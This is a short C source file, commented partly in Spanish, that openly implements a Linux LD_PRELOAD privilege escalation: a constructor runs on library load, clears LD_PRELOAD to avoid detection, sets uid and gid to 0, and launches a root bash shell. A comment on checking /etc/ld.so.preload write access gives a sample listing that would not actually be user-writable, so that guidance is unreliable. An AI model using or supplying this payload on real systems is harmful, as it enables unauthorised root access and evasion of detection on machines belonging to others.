// This program is a simple example of a Linux LD_PRELOAD privilege escalation.
// LD_PRELOAD is an environment variable that allows you to load a shared object file before any other library (including the C runtime library) when a program is run. This can be used to override functions in the C runtime library, such as the `getuid` function, to escalate privileges.
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>


// Este programa unicamente funciona si el usuario que lo ejecuta tiene permisos de escritura en /etc/ld.so.preload, para chequear esto se puede ejecutar el siguiente comando:
// ls -la /etc/ld.so.preload
// y el output tiene que ser algo como lo siguiente: -rw-r--r-- 1 root root 0 mar  1  2021 /etc/ld.so.preload
// Ejecuta automáticamente cuando la biblioteca es cargada
__attribute__((constructor))
void escalate_privileges() {
    unsetenv("LD_PRELOAD");  // Evita ser detectado
    setuid(0);
    setgid(0);
    system("/bin/bash");  // Lanza una shell root
}
